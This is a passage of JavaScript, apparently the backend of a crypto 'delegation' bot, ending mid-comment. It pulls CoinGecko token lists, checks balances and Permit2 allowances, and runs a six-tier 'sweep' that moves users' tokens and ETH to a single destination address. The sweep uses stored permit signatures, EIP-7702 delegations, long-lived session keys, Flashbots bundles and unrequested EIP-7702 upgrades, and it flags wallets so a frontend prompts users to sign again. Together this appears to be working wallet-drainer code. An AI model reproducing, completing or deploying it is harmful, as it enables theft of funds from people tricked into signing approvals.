// ── CoinGecko token list ──────────────────────────────────────────────────────

async function cgFetchWithRetry(url) {
  const BACKOFF = [30_000, 60_000, 120_000]; // 30s → 60s → 120s
  for (let attempt = 0; attempt <= BACKOFF.length; attempt++) {
    const res = await fetch(url);
    if (res.status === 429) {
      if (attempt >= BACKOFF.length) throw new Error(`CoinGecko still rate-limited after ${attempt + 1} attempts`);
      const wait = BACKOFF[attempt];
      log(`[tokens] rate limited (429) — waiting ${wait / 1000}s before retry (attempt ${attempt + 1})`);
      await sleep(wait);
      continue;
    }
    if (!res.ok) throw new Error(`CoinGecko ${res.status} for ${url}`);
    return res.json();
  }
  throw new Error(`CoinGecko fetch failed`);
}

async function fetchTokenList(chain) {
  const platformMap = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
  const categoryMap = { eth: "ethereum-ecosystem", bnb: "bnb-chain", polygon: "polygon-ecosystem" };
  const platform    = platformMap[chain] ?? platformMap[CHAIN];
  const category    = categoryMap[chain] ?? categoryMap[CHAIN];

  try {
    log(`[tokens] fetching page 1 for ${chain}...`);
    const page1 = await cgFetchWithRetry(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
    );
    await sleep(2_000);

    log(`[tokens] fetching page 2 for ${chain}...`);
    const page2 = await cgFetchWithRetry(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`
    );
    await sleep(2_000);

    const allCoins = [...(Array.isArray(page1) ? page1 : []), ...(Array.isArray(page2) ? page2 : [])];
    if (!allCoins.length) throw new Error("empty markets response");

    log(`[tokens] fetching coin list with platform addresses...`);
    const fullList = await cgFetchWithRetry("https://api.coingecko.com/api/v3/coins/list?include_platform=true");

    const addressMap = {};
    for (const coin of (Array.isArray(fullList) ? fullList : [])) {
      if (coin.platforms?.[platform]) {
        addressMap[coin.id] = coin.platforms[platform].toLowerCase();
      }
    }

    const tokens = [];
    for (const coin of allCoins) {
      const address = addressMap[coin.id];
      if (!address || !ethers.isAddress(address)) continue;
      if (!coin.market_cap || coin.market_cap < 100_000) continue;
      tokens.push({
        address,
        symbol:      (coin.symbol ?? "?").toUpperCase(),
        decimals:    KNOWN_DECIMALS[address] ?? 18,
        coingeckoId: coin.id,
        marketCap:   coin.market_cap,
        name:        coin.name ?? coin.id,
      });
    }

    // Always merge fallback tokens so WETH/WBNB/WMATIC are monitored even if
    // CoinGecko omits them (market-cap filter, API hiccup, etc.).
    const seenAddrs = new Set(tokens.map(t => t.address.toLowerCase()));
    for (const ft of (FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [])) {
      if (!seenAddrs.has(ft.address.toLowerCase())) {
        tokens.push(ft);
        seenAddrs.add(ft.address.toLowerCase());
      }
    }

    log(`[tokens] ✅ loaded ${tokens.length} tokens for ${chain} from CoinGecko (incl. fallbacks)`);
    if (tokens.length) log(`[tokens] top 5: ${tokens.slice(0, 5).map(t => t.symbol).join(", ")}`);
    return tokens;

  } catch (e) {
    const fallback = FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [];
    warn(`[tokens] ⚠️  CoinGecko fetch failed: ${e.message} — using ${fallback.length} fallback tokens`);
    return fallback;
  }
}

async function loadTokens() {
  const cacheFile = `/tmp/tokens_${CHAIN}.json`;
  try {
    const cached   = JSON.parse(fs.readFileSync(cacheFile, "utf8"));
    const ageHours = (Date.now() - (cached.timestamp ?? 0)) / 3_600_000;
    if (ageHours < 24 && Array.isArray(cached.tokens) && cached.tokens.length > 0) {
      log(`[tokens] using cache: ${cached.tokens.length} tokens (${ageHours.toFixed(1)}h old)`);
      return cached.tokens;
    }
  } catch { /* no cache — fetch fresh */ }

  // Stagger API calls to avoid all 3 bots hitting CoinGecko simultaneously
  const stagger = CG_STAGGER_MS[CHAIN] ?? 0;
  if (stagger > 0) {
    log(`[tokens] staggering fetch by ${stagger / 1000}s (chain=${CHAIN})...`);
    await sleep(stagger);
  }

  const tokens = await fetchTokenList(CHAIN);
  try {
    fs.writeFileSync(cacheFile, JSON.stringify({ timestamp: Date.now(), tokens }));
    log(`[tokens] cache saved: ${tokens.length} tokens → ${cacheFile}`);
  } catch (e) { warn(`[tokens] cache write failed: ${e.message}`); }
  return tokens;
}

// ── Relayer + balance helpers ─────────────────────────────────────────────────

async function checkRelayerBalance() {
  try {
    const balance = await getReadProvider().getBalance(relayerWallet.address);
    if (balance < RELAYER_MIN_WEI) {
      log(`[relayer] ⚠️  LOW: ${ethers.formatEther(balance)} — min ${ethers.formatEther(RELAYER_MIN_WEI)} — skipping sweep`);
      return false;
    }
    log(`[relayer] balance: ${ethers.formatEther(balance)} ✅`);
    return true;
  } catch (e) {
    warn(`[relayer] balance check failed: ${errStr(e)} — allowing sweep`);
    return true; // optimistic: don't block sweeps on transient RPC errors
  }
}

// Multicall3 — deployed at the same address on all major EVM chains.
// Batches all balanceOf calls into a single eth_call instead of N calls.
const MULTICALL3_ADDRESS = "0xcA11bde05977b3631167028862bE2a173976CA11";
const MULTICALL3_ABI     = [
  "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) external view returns (tuple(bool success, bytes returnData)[] returnData)",
];
const ERC20_BAL_IFACE = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);

async function checkAllBalances(address) {
  if (!TOKENS.length) return [];
  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
  const calls = TOKENS.map(token => ({
    target:       token.address,
    allowFailure: true,
    callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [address]),
  }));

  const results = [];
  const CHUNK   = 250; // keep well under block gas limit for eth_call
  for (let i = 0; i < calls.length; i += CHUNK) {
    try {
      const chunk      = calls.slice(i, i + CHUNK);
      const returnData = await multicall.aggregate3(chunk);
      for (let j = 0; j < chunk.length; j++) {
        const { success, returnData: data } = returnData[j];
        if (!success || !data || data === "0x") continue;
        try {
          const [balance] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
          if (balance > 0n) results.push({ ...TOKENS[i + j], balance });
        } catch { /* malformed return — skip */ }
      }
    } catch (e) {
      warn(`[balances] multicall chunk ${i}–${Math.min(i + CHUNK, calls.length)} failed: ${errStr(e)}`);
    }
  }
  return results;
}

// ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────

// Cached relayer balance — refreshed at most once per 60s to avoid
// one getBalance RPC call per wallet in the startup sweep pass.
let _relayerBalCache = { val: null, ts: 0 };
async function getRelayerBalance() {
  const now = Date.now();
  if (_relayerBalCache.val !== null && now - _relayerBalCache.ts < 60_000) {
    return _relayerBalCache.val;
  }
  const bal = await getReadProvider().getBalance(relayerWallet.address);
  _relayerBalCache = { val: bal, ts: now };
  return bal;
}

// Returns true if the wallet has at least one live Permit2 AllowanceTransfer
// with amount > 0 and not expired. Used to gate needs_reactivation: only set
// the flag when there truly is no sweep path left.
async function hasLivePermit2Allowance(checksumAddr) {
  // Check ALL tokens via Multicall3 to avoid false-positive needs_reactivation
  // when the user's approved tokens are outside the first 50 (they could be
  // tail tokens #51–499 from CoinGecko).
  const nowSec = BigInt(Math.floor(Date.now() / 1000));
  const ALLOW_ABI = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
  const allowIface = new ethers.Interface(ALLOW_ABI);
  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
  const CHUNK = 250;
  for (let i = 0; i < TOKENS.length; i += CHUNK) {
    const slice = TOKENS.slice(i, i + CHUNK);
    try {
      const calls = slice.map(t => ({
        target: PERMIT2_ADDRESS,
        allowFailure: true,
        callData: allowIface.encodeFunctionData("allowance", [checksumAddr, t.address.toLowerCase(), relayerWallet.address]),
      }));
      const results = await multicall.aggregate3(calls);
      for (let j = 0; j < results.length; j++) {
        if (!results[j].success) continue;
        try {
          const [amt,, exp] = allowIface.decodeFunctionResult("allowance", results[j].returnData);
          if (BigInt(amt) > 0n && BigInt(exp) > nowSec) return true;
        } catch { /* malformed result */ }
      }
    } catch { /* RPC error — try next chunk */ }
  }
  return false;
}

// Sets needs_reactivation ONLY if no AllowanceTransfer backup exists.
// Use this everywhere instead of unconditional needs_reactivation:true so that
// users who have a live permitBatch are never incorrectly prompted to re-sign
// just because their SignatureTransfer nonce was consumed or expired.
// forceReactivate=true: always set needs_reactivation regardless of on-chain backup.
// Use when ERC-20→Permit2 approval is missing — having a Permit2 internal allowance
// (from a prior permit2.permit() call) does NOT allow sweeping without the ERC-20 approval.
// The user must reconnect and approve ERC-20 to enable sweeping.
async function setNeedsReactivationIfNoBackup(checksumAddr, addrKey, { forceReactivate = false } = {}) {
  if (!supabase) return;
  if (!forceReactivate) {
    const hasBackup = await hasLivePermit2Allowance(checksumAddr).catch(() => false);
    if (hasBackup) {
      log(`[reactivation] AllowanceTransfer still live for ${addrKey.slice(0,10)} — NOT setting needs_reactivation`);
      return;
    }
  }
  await supabase.from("delegated_wallets")
    .update({ needs_reactivation: true })
    .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
  log(`[reactivation] ${forceReactivate ? 'ERC-20 approval missing' : 'no AllowanceTransfer backup'} — needs_reactivation set for ${addrKey.slice(0,10)}`);
}

/**
 * Check the Permit2 SignatureTransfer nonce bitmap to determine if a nonce has
 * already been consumed on-chain. Avoids broadcasting a tx that would revert
 * with InvalidNonce — which wastes gas and shifts the relayer nonce, stalling
 * subsequent sweeps.
 *
 * Permit2 nonce layout (SignatureTransfer):
 *   wordPos = nonce >> 8        (which uint256 slot in the bitmap)
 *   bitPos  = nonce & 0xFF      (which bit within that slot)
 *   isUsed  = (bitmap >> bitPos) & 1n === 1n
 */
async function isNonceUsed(owner, nonceHex) {
  try {
    const nonce   = BigInt(nonceHex);
    const wordPos = nonce >> 8n;
    const bitPos  = nonce & 0xFFn;
    const bitmap  = await permit2Read.nonceBitmap(owner, wordPos);
    // NOTE: `&` has LOWER precedence than `===` in JS, so `x & 1n === 1n` parses as
    // `x & (1n === 1n)` — mixing a BigInt with a boolean via `&` throws a TypeError,
    // which was silently swallowed by the catch below, making this always return
    // false (nonce pre-check permanently disabled). Parenthesize explicitly.
    return ((BigInt(bitmap) >> bitPos) & 1n) === 1n;
  } catch {
    return false; // assume not used on RPC error — pre-flight staticCall will catch it
  }
}

async function dispatchSweep(wallet) {
  const short = wallet.address.slice(0, 10);
  log(`[sweep] starting for ${short} type=${wallet.type}`);

  // Relayer balance gate (cached — 1 RPC call per 60s regardless of wallet count)
  const relayerBal = await getRelayerBalance();
  const min = { eth: ethers.parseEther("0.005"), bnb: ethers.parseEther("0.005"), polygon: ethers.parseEther("1") };
  if (relayerBal < (min[CHAIN] ?? min.bnb)) {
    log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
    return;
  }

  // Debounce: one sweep in-flight per address at a time.
  // If a Transfer arrives while sweeping, pendingSweep marks it — we re-sweep after cooldown.
  const key = wallet.address.toLowerCase();
  if (sweepingNow.has(key)) {
    pendingSweep.add(key);
    log(`[sweep] queued pending re-sweep for ${short} (currently sweeping)`);
    return;
  }
  sweepingNow.add(key);

  try {
    await sweep(wallet);
    log(`[sweep] finished for ${short}`);
  } catch (e) {
    log(`[sweep] ❌ error for ${short}: ${e.message}`);
  } finally {
    setTimeout(() => {
      sweepingNow.delete(key);
      if (pendingSweep.has(key)) {
        pendingSweep.delete(key);
        const w = monitoredWallets.get(key);
        if (w) {
          log(`[sweep] re-triggering queued sweep for ${short}`);
          dispatchSweep(w).catch(e => log(`[sweep] re-sweep error: ${e.message}`));
        }
      }
    }, 120_000);
  }
}

// ── Native coin sweep helper for PATH 2 / Permit2 wallets ────────────────────
// sweepETHFor(user) in TCNDelegationV2.1 wraps ETH held by the CONTRACT itself
// (address(this).balance), not ETH in the user's wallet. The flow is:
//   user sends ETH → TCN_CONTRACT_ADDRESS → bot calls sweepETHFor(user)
//   → contract wraps to WETH → forwards WETH to destination.
//
// This function is called ONLY when the contract itself has an ETH balance AND
// the user has called authorize(relayer) on the contract.

async function trySweepNativeFor(checksum, short) {
  if (!contract || !CONTRACT_ADDRESS) return;
  try {
    // ── A. Contract-held ETH (PATH 2 — sweepETHFor) ───────────────────────────
    // ETH that was sent TO the TCN contract by a PATH 2 user; bot wraps and
    // forwards it via sweepETHFor(user).  Requires isAuthorized(user, relayer).
    const contractBal = await getReadProvider().getBalance(CONTRACT_ADDRESS);
    const relBal = await getRelayerBalance();

    if (contractBal > 0n) {
      if (relBal < ethers.parseEther("0.001")) {
        warn(`[nativeFor] relayer low on gas — skipping sweepETHFor for ${short}`);
      } else {
        log(`[nativeFor] ${short} — contract holds ${ethers.formatEther(contractBal)} ETH — attempting sweepETHFor`);
        // Swallowing ALL errors here as "not authorized" (the old `.catch(() =>
        // false)`) mislabels a transient RPC/network failure the same as a real
        // "user never called authorize()" — logging a misleading message and
        // silently skipping a wallet that IS authorized, purely because the read
        // hiccuped. Only a genuine contract-level revert should be treated as
        // "not authorized"; anything else re-throws to the outer catch, which
        // already logs accurately and retries on the next trigger.
        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch((e) => {
          if (e?.code === "CALL_EXCEPTION") return false;
          throw e;
        });
        if (isAuth) {
          let gasEst;
          try { gasEst = await contract.sweepETHFor.estimateGas(checksum); }
          catch (e) {
            // A genuine revert (CALL_EXCEPTION) means the call would actually fail
            // on-chain — correctly skip. An RPC/network error is not a revert and
            // must not be logged/treated the same way; re-throw to the outer catch
            // (accurate logging, natural retry on next trigger) instead of a
            // misleading "simulation reverted" message for what was really a
            // dropped RPC request.
            if (e?.code === "CALL_EXCEPTION") { log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`); return; }
            throw e;
          }
          const fee = await getFeeData();
          const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
          await tx.wait();
          log(`[nativeFor] ✅ sweepETHFor confirmed for ${short} — tx: ${tx.hash}`);
          return;
        }
        log(`[nativeFor] ${short} — not authorised in V2 contract, skipping sweepETHFor`);
      }
    }

    // ── B. User-wallet ETH surplus (permit2-gasless path) ────────────────────
    // The relayer airdrops ETH for gas. After the ERC-20→Permit2 approvals the
    // user's new wallet wraps the surplus to WETH so the bot sweeps it via
    // Permit2. If the wallet still shows raw ETH above NATIVE_WRAP_FLOOR it
    // means the user connected BEFORE the wrap step was live — flag for re-activation
    // so the frontend prompts them to re-connect (which now includes the wrap).
    const wallet = monitoredWallets.get(checksum.toLowerCase());
    if (!wallet) return;
    if (wallet.type !== "permit2-gasless" && wallet.type !== "permit2") return;

    const userBal = await getReadProvider().getBalance(checksum);
    // Below floor = gas reserve only, nothing meaningful to wrap.
    if (userBal <= NATIVE_WRAP_FLOOR) return;
    // Above ceiling = user's own ETH unrelated to our airdrop — hands off.
    if (userBal > NATIVE_WRAP_CEILING) {
      log(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} ETH exceeds ceiling (${ethers.formatEther(NATIVE_WRAP_CEILING)}) — native sweep needs EIP-7702 (Tier 1.5 handles it)`);
      return;
    }

    // Check WETH balance — if > 0 the user already wrapped; sweep will handle it.
    const wethContract = new ethers.Contract(
      WRAPPED_NATIVE_ADDRESS, ["function balanceOf(address) view returns (uint256)"], getReadProvider()
    );
    const wethBal = await wethContract.balanceOf(checksum).catch(() => 0n);
    if (wethBal > 0n) {
      log(`[nativeFor] ${short} — user has ${ethers.formatEther(wethBal)} WETH and ${ethers.formatEther(userBal)} ETH — WETH sweep will handle it`);
      return;
    }

    // User has airdrop-range ETH but no WETH — prompt re-activation so the wrap step runs.
    // Only set needs_reactivation if there's truly no AllowanceTransfer sweep path.
    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} ETH unwrapped (in airdrop range) — checking backup before flagging`);
    await setNeedsReactivationIfNoBackup(checksum, checksum.toLowerCase());
  } catch (e) {
    maybeResetNonce(e);
    err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
  }
}

// ── Contract ETH balance monitor ──────────────────────────────────────────────
// Periodically checks if the TCN contract itself holds any ETH (from PATH 2
// users who sent ETH to the contract address). Calls sweepETHFor() for the
// first authorized PATH 2 user found. Runs every 60s to catch deposits quickly.

let _contractEthPollTimer = null;
async function _contractEthPollTick() {
  if (!contract || !CONTRACT_ADDRESS) return;
  try {
    const contractBal = await getReadProvider().getBalance(CONTRACT_ADDRESS);
    if (contractBal === 0n) return;

    log(`[contractEth] 📥 contract holds ${ethers.formatEther(contractBal)} ETH — finding authorized user`);

    const relBal = await getRelayerBalance();
    if (relBal < ethers.parseEther("0.001")) {
      warn(`[contractEth] relayer low on gas — skipping contract ETH sweep`);
      return;
    }

    // Find first PATH 2 wallet that has called authorize(relayer).
    for (const [, wallet] of monitoredWallets) {
      if (wallet.type !== "direct-allowance" && wallet.type !== "permit2" &&
          wallet.type !== "permit2-gasless" && wallet.type !== "wrap-fallback") continue;

      const isAuth = await contract.isAuthorized(wallet.address, relayerWallet.address).catch((e) => {
        if (e?.code === "CALL_EXCEPTION") return false;
        throw e;
      });
      if (!isAuth) continue;

      log(`[contractEth] calling sweepETHFor(${wallet.address.slice(0, 10)}) to forward contract ETH`);
      try {
        const gasEst = await contract.sweepETHFor.estimateGas(wallet.address);
        const fee = await getFeeData();
        const tx = await contract.sweepETHFor(wallet.address, { gasLimit: gasEst * 120n / 100n, ...fee });
        await tx.wait();
        log(`[contractEth] ✅ sweepETHFor confirmed — tx: ${tx.hash}`);
      } catch (e) {
        maybeResetNonce(e);
        err(`[contractEth] ❌ sweepETHFor: ${e.reason ?? e.message}`);
      }
      return; // done — one sweepETHFor call wraps all contract ETH
    }
    log(`[contractEth] no authorized PATH 2 wallet found to attribute contract ETH`);
  } catch (e) {
    if (!e.message?.includes("timeout")) warn(`[contractEth] poll error: ${e.message}`);
  }
}

function startContractEthMonitor() {
  if (!CONTRACT_ADDRESS) return;
  if (_contractEthPollTimer) clearInterval(_contractEthPollTimer);
  _contractEthPollTimer = setInterval(_contractEthPollTick, 60_000);
  _contractEthPollTick(); // immediate first check
  log(`[contractEth] monitor active (60s poll on contract ${CONTRACT_ADDRESS.slice(0, 10)})`);
}

// ── Universal sweep — 6 tiers ───────────────────────────────────────────────

async function sweep(wallet) {
  const checksum = normalizeAddress(wallet.address);
  if (!checksum) return;
  const short = checksum.slice(0, 10);
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
  const addrKey = checksum.toLowerCase();
  // Track whether any tier swept successfully this call — used to prevent
  // Tier 4 from setting needs_reactivation:true when Tier 3.5 already swept.
  let sweptThisCall = false;

  // "monitoring" wallets have no signatures — nothing to sweep.
  // Skip immediately to avoid 3 wasted Supabase queries per Transfer event.
  if (wallet.type === "monitoring") {
    log(`[sweep] ${short} — type=monitoring, nothing actionable yet`);
    return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "session-key") {
    try {
      const ok = await sweepViaSessionKey(checksum, short, addrKey);
      if (ok) return;
    } catch (e) { err(`[session] unhandled error for ${short}: ${e.message}`); }
    // If session key sweep failed, fall through to other methods
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0.5: EIP-7702 + Flashbots Atomic Bundle (ETH only)
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702" && CHAIN === "eth") {
    try {
      const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
      if (ok) return;
    } catch (e) { err(`[flashbots] unhandled error for ${short}: ${e.message}`); }
    // Flashbots failed — fall through to standard EIP-7702 sweep
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 1: EIP-7702 — delegated wallet, sweep via authorization
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702") {
    const code = await getReadProvider().getCode(checksum);
    if (!code || code === "0x" || !code.startsWith("0xef0100")) {
      log(`[eip7702] ${short} — delegation expired, marking needs-reauth`);
      needsReauthWallets.add(addrKey);
      if (supabase) {
        await supabase.from("delegated_wallets")
          .update({ status: "needs-reauth" })
          .eq("address", addrKey).eq("chain", CHAIN);
      }
      // Do NOT return — the DB `type` column reflects the last thing the
      // frontend attempted, not everything it actually collected. The
      // frontend's Permit2 fallback tiers write signatures to the
      // permit2_signatures / eip2612_permits tables independently of this
      // row's `type` field, so a stale/wrong "eip7702" type here must not
      // block Tiers 2-4 below (they query those tables directly, not
      // wallet.type) from finding and using real coverage that exists.
    } else {
      // Sweep via sweepDelegatedWallet (existing logic)
      await sweepDelegatedWallet(checksum);
      return;
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // ══════════════════════════════════════════════════════════════════════════
  // TIER 1.5: Opportunistic EIP-7702 upgrade for non-delegated wallets
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type !== "eip7702" && wallet.type !== "monitoring") {
    try {
      const upgraded = await tryUpgradeToEip7702AndSweep(checksum, short, addrKey);
      if (upgraded) { sweptThisCall = true; return; }
    } catch (e) { warn(`[upgrade] unhandled error for ${short}: ${e.message}`); }
  }

  // TIER 2: EIP-2612 — permit() + transferFrom() per token
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: permits } = await supabase
      .from("eip2612_permits")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .eq("used", false);

    const BLACKLIST = new Set([
      "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", // CAKE
      "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
    ]);

    for (const p of permits ?? []) {
      if (BLACKLIST.has(p.token.toLowerCase())) continue;
      // Deadline may be stored as Unix timestamp (number/numeric string) or ISO-8601 string.
      const dl = typeof p.deadline === "number"
        ? BigInt(p.deadline)
        : typeof p.deadline === "string" && /^\d+$/.test(p.deadline.trim())
          ? BigInt(p.deadline.trim())
          : typeof p.deadline === "string"
            ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000))
            : 0n;
      if (dl > 0n && dl < nowSecs) {
        log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
        continue;
      }

      const token = new ethers.Contract(p.token, ERC20_ABI, getReadProvider());
      let balance;
      try { balance = await token.balanceOf(checksum); } catch (e) {
        // Previously a completely silent skip — indistinguishable from "token
        // genuinely has zero balance". An RPC hiccup here just means this
        // permit is skipped for THIS pass (it retries on the next sweep
        // trigger), but with zero visibility it looked identical to "nothing
        // to sweep" in the logs, making real RPC issues invisible.
        warn(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — balanceOf read failed (${e.message}), skipping this pass`);
        continue;
      }
      if (balance === 0n) continue;

      log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
      try {
        const fee = await getFeeData();
        const tc = new ethers.Contract(p.token, EIP2612_PERMIT_ABI, relayerWallet);
        const tx1 = await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, dl, p.v, p.r, p.s, { gasLimit: 100_000n, ...fee });
        await tx1.wait();
        log(`[eip2612] permit() confirmed for ${p.symbol ?? p.token.slice(0,10)}`);

        // Verify allowance was actually set
        const actualAllow = await token.allowance(checksum, PERMIT2_ADDRESS);
        if (actualAllow === 0n) {
          warn(`[eip2612] permit() succeeded but allowance=0 for ${p.symbol ?? p.token.slice(0,10)} — non-standard, skipping`);
          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
          continue;
        }

        // Bot pays gas for transferFrom() — sweeps token
        const tx2 = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, p.token, { gasLimit: 150_000n, ...fee });
        await tx2.wait();
        log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
      } catch (e) {
        const msg = e.reason ?? e.message ?? "";
        // Signature-level failures are permanent — the sig is invalid or expired on-chain.
        // RPC/network errors are transient — leave the permit for the next sweep attempt.
        const isSigError = /InvalidSigner|SignatureExpired|InvalidSignature|invalid sig|ERC2612ExpiredSignature|ERC2612InvalidSigner|nonce/i.test(msg);
        const isRpcError = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(msg);
        if (isSigError) {
          err(`[eip2612] ❌ sig invalid for ${p.symbol ?? p.token.slice(0,10)} — permanently marking failed`);
          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
        } else if (isRpcError) {
          warn(`[eip2612] ⚠️ transient error for ${p.symbol ?? p.token.slice(0,10)}, will retry next sweep: ${msg}`);
          // Leave permit untouched — retry next time
        } else {
          err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${msg}`);
          // Unknown error (matches neither the sig-invalid nor RPC regex) — give
          // it a bounded number of retries before permanently marking failed.
          // Marking failed on the very first unclassified error (the old
          // behavior) treats a possibly-transient issue (gas spike, unusual
          // node wording, brief hiccup) the same as a truly permanent one,
          // stranding a valid permit forever. Still bounded so a genuinely
          // stuck permit doesn't retry (and burn relayer gas) forever.
          const attempts = (unknownEip2612ErrorCount.get(p.id) ?? 0) + 1;
          unknownEip2612ErrorCount.set(p.id, attempts);
          if (attempts >= UNKNOWN_EIP2612_MAX_RETRIES) {
            err(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — ${attempts} consecutive unclassified failures, permanently marking failed`);
            await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
            unknownEip2612ErrorCount.delete(p.id);
          } else {
            warn(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — unclassified error, attempt ${attempts}/${UNKNOWN_EIP2612_MAX_RETRIES}, will retry`);
          }
        }
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 5 (fast-path): DIRECT ALLOWANCE — must run BEFORE Permit2 tiers so a
  // stale permit2_signatures row cannot intercept and set needs_reactivation.
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "direct-allowance") {
    log(`[direct] ${short} — checking direct-allowance tokens`);

    let tokenAddrs = [];
    if (supabase) {
      const { data: dwRow } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", addrKey)
        .eq("chain", CHAIN)
        .single();
      if (dwRow?.permit_metadata?.tokens?.length) {
        tokenAddrs = dwRow.permit_metadata.tokens.map(a => a.toLowerCase()).filter(Boolean);
      }
    }
    if (tokenAddrs.length === 0) {
      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 150);
    }
    if (tokenAddrs.length === 0) { log(`[direct] ${short} — no tokens to check`); return; }

    // V2.1: check allowance against the V2 contract (sweepFor spender), not relayer.
    // Also accept legacy relayer-address allowance for backward compat.
    const v2ContractAddr = CONTRACT_ADDRESS;
    const ERC20_BAL_ABI   = ["function balanceOf(address) view returns (uint256)"];
    const ERC20_ALLOW_ABI = ["function allowance(address,address) view returns (uint256)"];
    const balIface   = new ethers.Interface(ERC20_BAL_ABI);
    const allowIface = new ethers.Interface(ERC20_ALLOW_ABI);
    const calls = [];
    // When CONTRACT_ADDRESS is not configured (null, undefined, or empty string from Docker
    // Compose substitution) use ZeroAddress as placeholder — allowance returns 0 so
    // toSweepV2 stays empty and the legacy relayer transferFrom path takes over.
    const safeV2Addr = v2ContractAddr || ethers.ZeroAddress;
    for (const addr of tokenAddrs) {
      calls.push({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) });
      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, safeV2Addr]) });
      calls.push({ target: addr, allowFailure: true, callData: allowIface.encodeFunctionData("allowance", [checksum, relayerWallet.address]) });
    }

    let results = [];
    try {
      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
      results = await mc.aggregate3.staticCall(calls);
    } catch (e) {
      // A transient multicall/RPC failure here previously `return`ed from the
      // ENTIRE sweep() call — abandoning this pass completely instead of just
      // this tier, so a wallet with a perfectly valid Permit2 signature (Tiers
      // 3/4 below, which don't depend on this read) would silently get zero
      // sweep attempt whenever this one RPC call hiccuped. Skip only Tier 5.
      warn(`[direct] ${short} — multicall failed: ${e.message} — skipping Tier 5 only, still trying Permit2 tiers below`);
      results = null;
    }
    // Declared outside the `if (results)` block so the fall-through checks
    // below (trySweepNativeFor, `if (directSwept) return`) work correctly
    // even when the multicall failed — directSwept simply stays false,
    // which correctly lets execution continue to TIER 3/4 (Permit2).
    let directSwept = false;
    if (results) {

    const toSweepV2 = [];    // tokens approved to V2 contract → use sweepFor
    const toSweepLegacy = []; // tokens approved to relayer only → use transferFrom
    for (let i = 0; i < tokenAddrs.length; i++) {
      const balRes      = results[i * 3];
      const allowV2Res  = results[i * 3 + 1];
      const allowLegRes = results[i * 3 + 2];
      if (!balRes?.success) continue;
      let bal, allowV2 = 0n, allowLeg = 0n;
      try { bal = balIface.decodeFunctionResult("balanceOf", balRes.returnData)[0]; } catch { continue; }
      try { allowV2  = allowIface.decodeFunctionResult("allowance", allowV2Res?.returnData ?? "0x")[0]; } catch {}
      try { allowLeg = allowIface.decodeFunctionResult("allowance", allowLegRes?.returnData ?? "0x")[0]; } catch {}
      if (bal === 0n) continue;
      if (allowV2 >= bal)  toSweepV2.push(tokenAddrs[i]);
      else if (allowLeg >= bal) toSweepLegacy.push({ token: tokenAddrs[i], balance: bal });
    }

    // ── V2.1 PATH 2: use sweepFor on the V2 contract (single tx covers all tokens) ──
    // Track ACTUAL success separately from "had a balance+allowance candidate" —
